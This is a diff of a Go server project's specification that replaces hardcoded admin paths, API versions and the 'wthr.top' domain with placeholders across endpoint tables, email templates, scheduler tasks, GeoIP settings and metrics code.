-| `/api/v1/admin/server/tor/regenerate` | POST | Regenerate .onion address |
-| `/api/v1/admin/server/tor/vanity` | GET | Get vanity generation status |
-| `/api/v1/admin/server/tor/vanity` | POST | Start vanity generation |
-| `/api/v1/admin/server/tor/vanity` | DELETE | Cancel vanity generation |
-| `/api/v1/admin/server/tor/vanity/apply` | POST | Apply vanity address |
-| `/api/v1/admin/server/tor/import` | POST | Import external keys |
-
-### Admin - Web (`/api/v1/admin/server/web/`)
+### Admin - Branding (`/api/{api_version}/{admin_path}/server/branding/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/web` | GET | Get web settings |
-| `/api/v1/admin/server/web` | PATCH | Update web settings |
-| `/api/v1/admin/server/web/robots` | GET | Get robots.txt config |
-| `/api/v1/admin/server/web/robots` | PATCH | Update robots.txt |
-| `/api/v1/admin/server/web/robots/preview` | GET | Preview robots.txt |
-| `/api/v1/admin/server/web/security` | GET | Get security.txt config |
-| `/api/v1/admin/server/web/security` | PATCH | Update security.txt |
-| `/api/v1/admin/server/web/security/preview` | GET | Preview security.txt |
+| `/api/{api_version}/{admin_path}/server/branding` | GET | Get branding settings |
+| `/api/{api_version}/{admin_path}/server/branding` | PATCH | Update branding |
 
-### Admin - Pages (`/api/v1/admin/server/pages/`)
+### Admin - SSL (`/api/{api_version}/{admin_path}/server/ssl/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/pages` | GET | Get all page settings |
-| `/api/v1/admin/server/pages/about` | GET | Get about page content |
-| `/api/v1/admin/server/pages/about` | PATCH | Update about page |
-| `/api/v1/admin/server/pages/privacy` | GET | Get privacy policy |
-| `/api/v1/admin/server/pages/privacy` | PATCH | Update privacy policy |
-| `/api/v1/admin/server/pages/contact` | GET | Get contact page settings |
-| `/api/v1/admin/server/pages/contact` | PATCH | Update contact page |
-| `/api/v1/admin/server/pages/help` | GET | Get help page content |
-| `/api/v1/admin/server/pages/help` | PATCH | Update help page |
+| `/api/{api_version}/{admin_path}/server/ssl` | GET | Get SSL settings |
+| `/api/{api_version}/{admin_path}/server/ssl` | PATCH | Update SSL settings |
+| `/api/{api_version}/{admin_path}/server/ssl/renew` | POST | Force certificate renewal |
 
-### Admin - Email (`/api/v1/admin/server/email/`)
+### Admin - Tor (`/api/{api_version}/{admin_path}/server/tor/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/email` | GET | Get email settings |
-| `/api/v1/admin/server/email` | PATCH | Update email settings |
-| `/api/v1/admin/server/email/test` | POST | Send test email |
-| `/api/v1/admin/server/email/templates` | GET | List email templates |
-| `/api/v1/admin/server/email/templates/{name}` | GET | Get template |
-| `/api/v1/admin/server/email/templates/{name}` | PUT | Update template |
-| `/api/v1/admin/server/email/templates/{name}/reset` | POST | Reset to default |
-| `/api/v1/admin/server/email/templates/{name}/preview` | POST | Preview template |
+| `/api/{api_version}/{admin_path}/server/tor` | GET | Get Tor status |
+| `/api/{api_version}/{admin_path}/server/tor` | PATCH | Update Tor settings |
+| `/api/{api_version}/{admin_path}/server/tor/regenerate` | POST | Regenerate .onion address |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | GET | Get vanity generation status |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | POST | Start vanity generation |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | DELETE | Cancel vanity generation |
+| `/api/{api_version}/{admin_path}/server/tor/vanity/apply` | POST | Apply vanity address |
+| `/api/{api_version}/{admin_path}/server/tor/import` | POST | Import external keys |
 
-### Admin - Scheduler (`/api/v1/admin/server/scheduler/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/scheduler` | GET | List scheduled tasks |
-| `/api/v1/admin/server/scheduler/{id}` | GET | Get task details |
-| `/api/v1/admin/server/scheduler/{id}` | PATCH | Update task |
-| `/api/v1/admin/server/scheduler/{id}/run` | POST | Run task now |
-| `/api/v1/admin/server/scheduler/{id}/enable` | POST | Enable task |
-| `/api/v1/admin/server/scheduler/{id}/disable` | POST | Disable task |
-
-### Admin - Backup (`/api/v1/admin/server/backup/`)
+### Admin - Web (`/api/{api_version}/{admin_path}/server/web/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/backup` | GET | List backups |
-| `/api/v1/admin/server/backup` | POST | Create backup |
-| `/api/v1/admin/server/backup/{id}` | GET | Get backup details |
-| `/api/v1/admin/server/backup/{id}` | DELETE | Delete backup |
-| `/api/v1/admin/server/backup/{id}/download` | GET | Download backup file |
-| `/api/v1/admin/server/backup/restore` | POST | Restore from backup |
+| `/api/{api_version}/{admin_path}/server/web` | GET | Get web settings |
+| `/api/{api_version}/{admin_path}/server/web` | PATCH | Update web settings |
+| `/api/{api_version}/{admin_path}/server/web/robots` | GET | Get robots.txt config |
+| `/api/{api_version}/{admin_path}/server/web/robots` | PATCH | Update robots.txt |
+| `/api/{api_version}/{admin_path}/server/web/robots/preview` | GET | Preview robots.txt |
+| `/api/{api_version}/{admin_path}/server/web/security` | GET | Get security.txt config |
+| `/api/{api_version}/{admin_path}/server/web/security` | PATCH | Update security.txt |
+| `/api/{api_version}/{admin_path}/server/web/security/preview` | GET | Preview security.txt |
 
-### Admin - Logs (`/api/v1/admin/server/logs/`)
+### Admin - Pages (`/api/{api_version}/{admin_path}/server/pages/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/logs` | GET | List log files |
-| `/api/v1/admin/server/logs/{type}` | GET | Get log entries |
-| `/api/v1/admin/server/logs/{type}/download` | GET | Download log file |
+| `/api/{api_version}/{admin_path}/server/pages` | GET | Get all page settings |
+| `/api/{api_version}/{admin_path}/server/pages/about` | GET | Get about page content |
+| `/api/{api_version}/{admin_path}/server/pages/about` | PATCH | Update about page |
+| `/api/{api_version}/{admin_path}/server/pages/privacy` | GET | Get privacy policy |
+| `/api/{api_version}/{admin_path}/server/pages/privacy` | PATCH | Update privacy policy |
+| `/api/{api_version}/{admin_path}/server/pages/contact` | GET | Get contact page settings |
+| `/api/{api_version}/{admin_path}/server/pages/contact` | PATCH | Update contact page |
+| `/api/{api_version}/{admin_path}/server/pages/help` | GET | Get help page content |
+| `/api/{api_version}/{admin_path}/server/pages/help` | PATCH | Update help page |
+
+### Admin - Email (`/api/{api_version}/{admin_path}/server/email/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/email` | GET | Get email settings |
+| `/api/{api_version}/{admin_path}/server/email` | PATCH | Update email settings |
+| `/api/{api_version}/{admin_path}/server/email/test` | POST | Send test email |
+| `/api/{api_version}/{admin_path}/server/email/templates` | GET | List email templates |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}` | GET | Get template |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}` | PUT | Update template |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}/reset` | POST | Reset to default |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}/preview` | POST | Preview template |
+
+### Admin - Scheduler (`/api/{api_version}/{admin_path}/server/scheduler/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/scheduler` | GET | List scheduled tasks |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}` | GET | Get task details |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}` | PATCH | Update task |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/run` | POST | Run task now |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/enable` | POST | Enable task |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/disable` | POST | Disable task |
+
+### Admin - Backup (`/api/{api_version}/{admin_path}/server/backup/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/backup` | GET | List backups |
+| `/api/{api_version}/{admin_path}/server/backup` | POST | Create backup |
+| `/api/{api_version}/{admin_path}/server/backup/{id}` | GET | Get backup details |
+| `/api/{api_version}/{admin_path}/server/backup/{id}` | DELETE | Delete backup |
+| `/api/{api_version}/{admin_path}/server/backup/{id}/download` | GET | Download backup file |
+| `/api/{api_version}/{admin_path}/server/backup/restore` | POST | Restore from backup |
+
+### Admin - Logs (`/api/{api_version}/{admin_path}/server/logs/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/logs` | GET | List log files |
+| `/api/{api_version}/{admin_path}/server/logs/{type}` | GET | Get log entries |
+| `/api/{api_version}/{admin_path}/server/logs/{type}/download` | GET | Download log file |
 
 ## Agent Management (OPTIONAL - When Agent is Enabled)
 
@@ -28453,13 +29966,13 @@ The admin panel MUST include a scheduler section with:
 
 **See PART 33 for full agent binary and setup details.**
 
-### Admin Panel (`/admin/server/agents`)
+### Admin Panel (`/{admin_path}/server/agents`)
 
 **Main agent dashboard showing all registered agents:**
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│  /admin/server/agents                                                         │
+│  /{admin_path}/server/agents                                                         │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │                                                                             │
 │  Connected Agents                                              [+ Add Agent] │
@@ -28488,13 +30001,13 @@ The admin panel MUST include a scheduler section with:
 | **Last Seen** | Time since last heartbeat/report |
 | **Health** | ✓ Good / ⚠ Warn / ✗ Error (based on agent metrics) |
 
-### Admin Panel (`/admin/server/agents/{name}`)
+### Admin Panel (`/{admin_path}/server/agents/{name}`)
 
 **Detailed view of a single agent:**
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│  /admin/server/agents/web-server-01                         [← Back to List] │
+│  /{admin_path}/server/agents/web-server-01                         [← Back to List] │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │                                                                             │
 │  web-server-01                                             ● Online         │
@@ -28541,13 +30054,13 @@ The admin panel MUST include a scheduler section with:
 └─────────────────────────────────────────────────────────────────────────────┘
 ```
 
-### Admin Panel (`/admin/server/agents/add`)
+### Admin Panel (`/{admin_path}/server/agents/add`)
 
 **Simple agent registration page:**
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│  /admin/server/agents/add                                   [← Back to List] │
+│  /{admin_path}/server/agents/add                                   [← Back to List] │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │                                                                             │
 │  Add New Agent                                                              │
@@ -28649,21 +30162,21 @@ func getDefaultAgentName() string {
 | Scope | Notification Message |
 |-------|---------------------|
 | Admin | "{name} has connected. Agent is now sending data to server for admin scope" |
-| User | "{name} has connected. Agent is now sending data for user {username}" |
-| Org | "{name} has connected. Agent is now sending data for org {orgname}" |
+| User | "{name} has connected. Agent is now sending data for user {user_name}" |
+| Org | "{name} has connected. Agent is now sending data for org {org_name}" |
 
 **Notification triggers:**
 - Agent first connection (registration complete)
 - Agent reconnection after disconnect
 - Agent status change (online/offline)
 
-### Admin Panel (`/admin/server/agents/remove`)
+### Admin Panel (`/{admin_path}/server/agents/remove`)
 
 **Agent removal page with confirmation:**
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│  /admin/server/agents/remove                                [← Back to List] │
+│  /{admin_path}/server/agents/remove                                [← Back to List] │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │                                                                             │
 │  Remove Agent                                                               │
@@ -28712,9 +30225,9 @@ func getDefaultAgentName() string {
 
 | Scope | Base Route | Owner Token | Agent Token |
 |-------|------------|-------------|-------------|
-| Admin | `/api/v1/admin/server/agents/` | `adm_` | `adm_agt_` |
-| User | `/api/v1/users/agents/` | `usr_` | `usr_agt_` |
-| Org | `/api/v1/orgs/{slug}/agents/` | `org_` | `org_agt_` |
+| Admin | `/api/{api_version}/{admin_path}/server/agents/` | `adm_` | `adm_agt_` |
+| User | `/api/{api_version}/users/agents/` | `usr_` | `usr_agt_` |
+| Org | `/api/{api_version}/orgs/{slug}/agents/` | `org_` | `org_agt_` |
 
 **Same endpoints for all scopes (replace `{base}` with scope route above):**
 
@@ -28738,15 +30251,15 @@ func getDefaultAgentName() string {
 **Examples:**
 ```
 # Admin agent (server infrastructure)
-POST /api/v1/admin/server/agents/register
+POST /api/{api_version}/{admin_path}/server/agents/register
 Authorization: Bearer adm_agt_abc123...
 
 # User agent (personal SaaS monitoring)
-POST /api/v1/users/agents/register
+POST /api/{api_version}/users/agents/register
 Authorization: Bearer usr_agt_xyz789...
 
 # Org agent (organization resources)
-POST /api/v1/orgs/acme-corp/agents/register
+POST /api/{api_version}/orgs/acme-corp/agents/register
 Authorization: Bearer org_agt_def456...
 ```
 
@@ -28756,7 +30269,7 @@ Agent data can be exposed via project-specific routes for different audiences:
 
 | Route | Description | Example |
 |-------|-------------|---------|
-| `/admin/server/agents/*` | Admin management UI | Full control |
+| `/{admin_path}/server/agents/*` | Admin management UI | Full control |
 | `/users/agents/*` | User's agent dashboard | Personal agents |
 | `/orgs/{slug}/agents/*` | Org agent dashboard | Org agents |
 | `/{custom}/status` | Public status page | Status dashboard |
@@ -28869,10 +30382,10 @@ Email templates allow Server Admins to customize ALL notification messages, incl
 | 1 | `127.0.0.1` | Loopback (same machine) | 25, 465, 587 |
 | 2 | `172.17.0.1` | Docker bridge gateway | 25, 465, 587 |
 | 3 | `{gateway_ip}` | Default gateway IP | 25, 465, 587 |
-| 4 | `wthr.top` | Detected FQDN (from GetFQDN) | 25, 465, 587 |
+| 4 | `{fqdn}` | Detected FQDN (from GetFQDN) | 25, 465, 587 |
 | 5 | `{global_ipv4}` | Global IPv4 (if available) | 25, 465, 587 |
-| 6 | `mail.wthr.top` | Common mail subdomain | 25, 465, 587 |
-| 7 | `smtp.wthr.top` | Common SMTP subdomain | 25, 465, 587 |
+| 6 | `mail.{fqdn}` | Common mail subdomain | 25, 465, 587 |
+| 7 | `smtp.{fqdn}` | Common SMTP subdomain | 25, 465, 587 |
 
 **Auto-Detection Process:**
 1. Try each host/port combination in priority order
@@ -28907,7 +30420,7 @@ server:
       from:
         # Default: app title
         name: ""
-        # Default: no-reply@wthr.top
+        # Default: no-reply@{fqdn}
         email: ""
 ```
 
@@ -28923,7 +30436,7 @@ server:
 | `SMTP_PASSWORD` | `smtp.password` | (none) |
 | `SMTP_TLS` | `smtp.tls` | auto |
 | `SMTP_FROM_NAME` | `from.name` | (app title) |
-| `SMTP_FROM_EMAIL` | `from.email` | no-reply@wthr.top |
+| `SMTP_FROM_EMAIL` | `from.email` | no-reply@{fqdn} |
 
 ### SMTP Requirement
 
@@ -28959,7 +30472,7 @@ server:
 - ✓ Show clear message: "Email features require SMTP configuration"
 
 **Admin Panel:**
-- If SMTP not configured, show banner: "⚠️ SMTP not configured. Email features disabled. [Configure SMTP](/admin/server/email)"
+- If SMTP not configured, show banner: "⚠️ SMTP not configured. Email features disabled. [Configure SMTP](/{admin_path}/server/email)"
 - Email-dependent features (password reset link, etc.) hidden until SMTP configured
 - Test email button validates SMTP actually works before enabling email features
 
@@ -28988,6 +30501,11 @@ server:
 | `scheduler_error` | Scheduled task failed | ✗ |
 | `breach_notification` | Data breach notification to affected users | ✓ |
 | `breach_admin_alert` | Breach detected alert to Server Admins | ✗ |
+| `security_report_received` | Acknowledgment to researcher who submitted a report (PART 11). Includes `tracking_id` and researcher status URL. PGP-encrypted to researcher pubkey if supplied. | ✓ |
+| `security_report_status_update` | State change update to researcher (triaged → confirmed → patching → disclosed) | ✓ |
+| `security_admin_notify` | Inbound security report alert to admins. PGP-encrypted to each admin's personal pubkey if configured. | ✗ |
+| `pgp_keypair_rotated` | Admin notification that the project PGP keypair was rotated (old fingerprint, new fingerprint, grace window) | ✗ |
+| `installation_secret_rotated` | Admin notification that `installation_secret` was rotated. Includes the 7-day grace-window expiry date. | ✗ |
 | `test` | Test email | ✗ |
 
 **Account Email (✓):** Must follow Account Email Requirements (visible link, disclaimer, etc.)
@@ -29018,7 +30536,7 @@ server:
 
 **Default Sender:**
 - From Name: `{app_name}` (defaults to binary name if not set)
-- From Address: `no-reply@wthr.top` (defaults to `no-reply@localhost` if FQDN not set)
+- From Address: `no-reply@{fqdn}` (defaults to `no-reply@localhost` if FQDN not set)
 - Reply-To: `{admin_email}` (if set, otherwise omitted)
 
 **Default Expiry Times:**
@@ -29062,9 +30580,9 @@ Hello,
 
 Your backup completed successfully.
 
-Filename: {filename}
+Filename: {file_name}
 Size: {size}
-Time: {timestamp}
+Time: {time_stamp}
 
 --
 {app_name}
@@ -29083,15 +30601,15 @@ Time: {timestamp}
 |----------|-------------|
 | `{app_name}` | Application name/title |
 | `{app_url}` | Application URL (full FQDN, e.g., `https://api.example.com`) |
-| `wthr.top` | Server FQDN only (e.g., `api.example.com`) |
+| `{fqdn}` | Server FQDN only (e.g., `api.example.com`) |
 | `{onion_url}` | Tor .onion full URL (e.g., `http://abc...xyz.onion`) |
 | `{onion_address}` | Tor .onion address only (e.g., `abc...xyz.onion`) |
 | `{i2p_url}` | I2P full URL (e.g., `http://abc...xyz.b32.i2p`) |
 | `{i2p_address}` | I2P address only (e.g., `abc...xyz.b32.i2p`) |
-| `{admin_email}` | Admin email address |
+| `{admin_email}` | Admin email — resolves to `server.contact.admin.email` (PART 12 → "Contact Configuration") |
 | `{recipient_email}` | Email address this message is being sent to |
 | `{recipient_username}` | Username of the account (if applicable) |
-| `{timestamp}` | Current date/time |
+| `{time_stamp}` | Current date/time |
 | `{year}` | Current year |
 
 ## Account Email Requirements 
@@ -29124,7 +30642,7 @@ Subject: Welcome to {app_name}
 WELCOME TO {APP_NAME}
 
 This email was sent to: {recipient_email}
-From: {app_name} (wthr.top)
+From: {app_name} ({fqdn})
 
 Hello {recipient_username},
 
@@ -29161,7 +30679,7 @@ Subject: Welcome to {app_name} - Admin Setup Complete
 ADMIN SETUP COMPLETE
 
 This email was sent to: {recipient_email}
-From: {app_name} (wthr.top)
+From: {app_name} ({fqdn})
 
 Congratulations! Your {app_name} instance is now configured.
 
@@ -29194,12 +30712,12 @@ Subject: Password Reset Request - {app_name}
 PASSWORD RESET REQUEST
 
 This email was sent to: {recipient_email}
-From: {app_name} (wthr.top)
-Requested at: {timestamp}
+From: {app_name} ({fqdn})
+Requested at: {time_stamp}
 Request IP: {ip}
 
 Someone requested a password reset for the account associated with this
-email address on {app_name} (wthr.top).
+email address on {app_name} ({fqdn}).
 
 To reset your password, visit the following link:
 
@@ -29229,11 +30747,11 @@ Subject: Verify Your Email - {app_name}
 EMAIL VERIFICATION
 
 This email was sent to: {recipient_email}
-From: {app_name} (wthr.top)
-Sent at: {timestamp}
+From: {app_name} ({fqdn})
+Sent at: {time_stamp}
 
 You (or someone) requested to add this email address to an account on
-{app_name} (wthr.top).
+{app_name} ({fqdn}).
 
 To verify this email address, visit the following link:
 
@@ -29264,7 +30782,7 @@ NEW LOGIN DETECTED
 
 This alert was sent to: {recipient_email}
 Account: {recipient_username}
-From: {app_name} (wthr.top)
+From: {app_name} ({fqdn})
 
 A new login was detected on your account:
 
@@ -29304,8 +30822,8 @@ SECURITY ALERT
 
 This alert was sent to: {recipient_email}
 Account: {recipient_username}
-From: {app_name} (wthr.top)
-Time: {timestamp}
+From: {app_name} ({fqdn})
+Time: {time_stamp}
 
 {event}
 
@@ -29342,8 +30860,8 @@ Subject: Two-Factor Authentication Disabled - {app_name}
 
 This alert was sent to: {recipient_email}
 Account: {recipient_username}
-From: {app_name} (wthr.top)
-Time: {timestamp}
+From: {app_name} ({fqdn})
+Time: {time_stamp}
 
 Two-factor authentication has been disabled on your account.
 
@@ -29379,8 +30897,8 @@ PASSWORD CHANGED
 
 This alert was sent to: {recipient_email}
 Account: {recipient_username}
-From: {app_name} (wthr.top)
-Time: {timestamp}
+From: {app_name} ({fqdn})
+Time: {time_stamp}
 
 The password for your account was successfully changed.
 
@@ -29418,8 +30936,8 @@ IMPORTANT SECURITY NOTICE
 
 This notice was sent to: {recipient_email}
 Account: {recipient_username}
-From: {app_name} (wthr.top)
-Date: {timestamp}
+From: {app_name} ({fqdn})
+Date: {time_stamp}
 Reference: {breach_id}
 
 We are writing to inform you of a security incident that may have affected
@@ -29521,8 +31039,8 @@ Subject: [{severity}] Security Breach Detected - {app_name}
 ---
 🚨 SECURITY BREACH DETECTED
 
-Server: {app_name} (wthr.top)
-Time: {timestamp}
+Server: {app_name} ({fqdn})
+Time: {time_stamp}
 Breach ID: {breach_id}
 
 ────────────────────────────────────────────────────────────────────────
@@ -29582,7 +31100,7 @@ Do not reply to this email.
 
 ## Template-Specific Variables
 
-**Note:** Account-related templates (marked ✓ above) also have access to `{recipient_email}`, `{recipient_username}`, and `wthr.top` from global variables.
+**Note:** Account-related templates (marked ✓ above) also have access to `{recipient_email}`, `{recipient_username}`, and `{fqdn}` from global variables.
 
 ### welcome
 
@@ -29620,7 +31138,7 @@ Do not reply to this email.
 ### email_verify
 | Variable | Description |
 |----------|-------------|
-| `{verify_link}` | Email verification URL (full URL, visible in email) |
+| `{verify_link}` | Email verification URL — the **output** of `BuildURL(r, "/auth/verify/{token}")` (PART 12 → "URL Display Rules"). Never computed inside the template; the request-handling code injects the resolved URL into the template context, so reverse-proxy / DOMAIN / proto / port detection happens once in Go and the template is just a substitution sink. |
 | `{expires}` | Link expiration time |
 
 ### login_alert
@@ -29659,14 +31177,14 @@ Do not reply to this email.
 ### backup_complete / backup_failed
 | Variable | Description |
 |----------|-------------|
-| `{filename}` | Backup filename |
+| `{file_name}` | Backup filename |
 | `{size}` | Backup file size |
 | `{error}` | Error message (failed only) |
 
 ### ssl_expiring / ssl_renewed
 | Variable | Description |
 |----------|-------------|
-| `wthr.top` | Domain name on certificate |
+| `{fqdn}` | Domain name on certificate |
 | `{expires_in}` | Days until expiration |
 | `{expiry_date}` | Expiration date |
 | `{valid_until}` | New validity date (renewed only) |
@@ -29717,7 +31235,7 @@ Do not reply to this email.
 | `{notify_deadline}` | Deadline for user notification (based on strictest standard) |
 | `{admin_url}` | Admin panel URL |
 
-## Admin Panel (/admin/server/email/templates)
+## Admin Panel (/{admin_path}/server/email/templates)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -29746,15 +31264,15 @@ Do not reply to this email.
 |----------|--------------|
 | `{app_name}` | Current app name from config |
 | `{app_url}` | Current app URL |
-| `wthr.top` | Current FQDN |
+| `{fqdn}` | Current FQDN |
 | `{recipient_email}` | `user@example.com` |
 | `{recipient_username}` | `sampleuser` |
-| `{reset_link}` | `https://wthr.top/auth/reset/sample123...` |
-| `{verify_link}` | `https://wthr.top/auth/verify/sample123...` |
+| `{reset_link}` | `https://{fqdn}/auth/reset/sample123...` |
+| `{verify_link}` | `https://{fqdn}/auth/verify/sample123...` |
 | `{expires}` | `24 hours` |
 | `{ip}` | `192.168.1.100` |
-| `{timestamp}` | Current timestamp |
-| `{admin_email}` | Admin email from config |
+| `{time_stamp}` | Current timestamp |
+| `{admin_email}` | Resolved from `server.contact.admin.email` (PART 12) |
 
 ### Send Test Email
 
@@ -29770,7 +31288,7 @@ Do not reply to this email.
 
 | Check | Error Message |
 |-------|---------------|
-| Unknown variable | `Unknown variable: {foo}. Did you mean wthr.top?` |
+| Unknown variable | `Unknown variable: {foo}. Did you mean {fqdn}?` |
 | Missing required variable | `Account emails must include {recipient_email}` |
 | Empty subject | `Subject cannot be empty` |
 | Empty body | `Body cannot be empty` |
@@ -29978,7 +31496,7 @@ Do not reply to this email.
   "type": "warning",
   "title": "SSL Certificate Expiring",
   "message": "Certificate expires in 3 days",
-  "link": "/admin/server/ssl",
+  "link": "/{admin_path}/server/ssl",
   "read": false,
   "created_at": "2025-01-15T10:30:00Z"
 }
@@ -29999,7 +31517,7 @@ Do not reply to this email.
 
 **Both Server Admins and users can configure their notification preferences.**
 
-### Admin Notification Preferences (`/admin/profile/notifications`)
+### Admin Notification Preferences (`/{admin_path}/profile/notifications`)
 
 | Category | Events | Default | Can Disable? |
 |----------|--------|---------|--------------|
@@ -30012,7 +31530,7 @@ Do not reply to this email.
 **Security notifications cannot be disabled** - these are critical for account security.
 
 ```
-Admin Notification Preferences (/admin/profile/notifications)
+Admin Notification Preferences (/{admin_path}/profile/notifications)
 ┌─────────────────────────────────────────────────────────────┐
 │  Notification Preferences                                   │
 ├─────────────────────────────────────────────────────────────┤
@@ -30132,7 +31650,7 @@ server:
       from:
         # Default: app title
         name: ""
-        # Default: no-reply@wthr.top
+        # Default: no-reply@{fqdn}
         email: ""
 
       # Per-event email settings (override defaults)
@@ -30236,7 +31754,7 @@ Every project MUST include these scheduled tasks:
 
 | Task | Default Schedule | Purpose | Skippable |
 |------|-----------------|---------|-----------|
-| `ssl_renewal` | Daily at 03:00 | Renew `{config_dir}/ssl/letsencrypt/wthr.top/` certs 7 days before expiry | No |
+| `ssl_renewal` | Daily at 03:00 | Renew `{config_dir}/ssl/letsencrypt/{fqdn}/` certs 7 days before expiry | No |
 | `geoip_update` | Weekly (Sunday 03:00) | Download/update ip-location-db GeoIP databases | Yes |
 | `blocklist_update` | Daily at 04:00 | Download/update IP/domain blocklists | Yes |
 | `cve_update` | Daily at 05:00 | Download/update CVE/security databases | Yes |
@@ -30484,7 +32002,7 @@ Execute task
 | `retry_delay` | 5m | Delay between retries |
 | `backoff` | exponential | Delay multiplier (5m, 10m, 20m) |
 
-### Admin Panel (/admin/server/scheduler)
+### Admin Panel (/{admin_path}/server/scheduler)
 
 | Section | Contents |
 |---------|----------|
@@ -30591,13 +32109,13 @@ Execute task
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/scheduler` | GET | List all tasks |
-| `/api/v1/admin/server/scheduler/{id}` | GET | Get task details |
-| `/api/v1/admin/server/scheduler/{id}` | PATCH | Update task settings |
-| `/api/v1/admin/server/scheduler/{id}/run` | POST | Run task immediately |
-| `/api/v1/admin/server/scheduler/{id}/enable` | POST | Enable task |
-| `/api/v1/admin/server/scheduler/{id}/disable` | POST | Disable task |
-| `/api/v1/admin/server/scheduler/{id}/history` | GET | Get execution history |
+| `/api/{api_version}/{admin_path}/server/scheduler` | GET | List all tasks |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}` | GET | Get task details |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}` | PATCH | Update task settings |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/run` | POST | Run task immediately |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/enable` | POST | Enable task |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/disable` | POST | Disable task |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/history` | GET | Get execution history |
 
 ### Shutdown Behavior
 
@@ -30691,7 +32209,7 @@ All databases from [sapics/ip-location-db](https://github.com/sapics/ip-location
 |----------|------|---------|
 | ASN | `asn.mmdb` | `https://cdn.jsdelivr.net/npm/@ip-location-db/asn-mmdb/asn.mmdb` |
 | Country | `country.mmdb` | `https://cdn.jsdelivr.net/npm/@ip-location-db/geo-whois-asn-country-mmdb/geo-whois-asn-country.mmdb` |
-| City | `city.mmdb` | `https://cdn.jsdelivr.net/npm/@ip-location-db/dbip-city-mmdb/dbip-city-ipv4.mmdb` |
+| City | `city.mmdb` | `https://cdn.jsdelivr.net/npm/@ip-location-db/dbip-city-mmdb/dbip-city-ipv4-num.mmdb` |
 | WHOIS | `whois.mmdb` | `https://cdn.jsdelivr.net/npm/@ip-location-db/geo-whois-asn-country-mmdb/geo-whois-asn-country.mmdb` |
 
 **Database Contents:**
@@ -30703,7 +32221,7 @@ All databases from [sapics/ip-location-db](https://github.com/sapics/ip-location
 | City | `city`, `region`, `postal_code`, `latitude`, `longitude`, `timezone` |
 | WHOIS | `registrant_org`, `asn`, `country_code` (combined lookup) |
 
-## Admin Panel (/admin/server/network/geoip)
+## Admin Panel (/{admin_path}/server/network/geoip)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -30778,7 +32296,7 @@ Authorization: Bearer <token>
 scrape_configs:
   - job_name: 'weather'
     static_configs:
-      - targets: ['app.internal:8080']
+      - targets: ['app.internal:64580']
     authorization:
       credentials: 'your-metrics-token-here'
 ```
@@ -31461,7 +32979,7 @@ import (
     "strconv"
     "time"
 
-    "github.com/apimgr/weather/src/server/metrics"
+    "github.com/apimgr/{internal_name}/src/server/metrics"
 )
 
 // metricsMiddleware records HTTP metrics for all requests
@@ -31545,7 +33063,7 @@ import (
     "database/sql"
     "time"
 
-    "github.com/apimgr/weather/src/server/metrics"
+    "github.com/apimgr/{internal_name}/src/server/metrics"
 )
 
 // MetricsDB wraps sql.DB with metrics
@@ -31646,7 +33164,7 @@ package cache
 import (
     "time"
 
-    "github.com/apimgr/weather/src/server/metrics"
+    "github.com/apimgr/{internal_name}/src/server/metrics"
 )
 
 // MetricsCache wraps a cache with metrics
@@ -31699,7 +33217,7 @@ package scheduler
 import (
     "time"
 
-    "github.com/apimgr/weather/src/server/metrics"
+    "github.com/apimgr/{internal_name}/src/server/metrics"
 )
 
 // RecordTaskStart records when a task starts
@@ -31973,16 +33491,16 @@ func StartUptimeUpdater() {
 ```
 # HELP weather_http_requests_total Total number of HTTP requests
 # TYPE weather_http_requests_total counter
-weather_http_requests_total{method="GET",path="/api/v1/users",status="200"} 1523
-weather_http_requests_total{method="POST",path="/api/v1/users",status="201"} 42
+weather_http_requests_total{method="GET",path="/api/{api_version}/users",status="200"} 1523
+weather_http_requests_total{method="POST",path="/api/{api_version}/users",status="201"} 42
 
 # HELP weather_http_request_duration_seconds HTTP request duration in seconds
 # TYPE weather_http_request_duration_seconds histogram
-weather_http_request_duration_seconds_bucket{method="GET",path="/api/v1/users",le="0.01"} 1400
-weather_http_request_duration_seconds_bucket{method="GET",path="/api/v1/users",le="0.1"} 1520
